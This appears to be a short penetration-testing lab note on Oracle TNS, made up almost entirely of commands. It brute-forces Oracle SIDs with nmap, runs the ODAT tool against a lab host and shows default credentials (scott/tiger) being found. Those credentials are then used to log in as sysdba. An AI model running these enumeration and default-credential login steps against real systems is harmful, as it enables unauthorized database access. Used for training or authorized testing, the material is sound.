# 🟢 Oracle TNS

```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

```
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```

```
./odat.py all -s 10.129.205.19 
```

```
[+] Accounts found on 10.129.205.19:1521/serviceName:XEXDB: 
scott/tiger
```

```
sqlplus scott/tiger@10.129.205.19/XE as sysdba
```

### Install SQLPlus

```
wget https://deb.parrot.sh/parrot/pool/non-free/o/oracle-instantclient-sqlplus/oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb

sudo dpkg -i oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb

sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

```
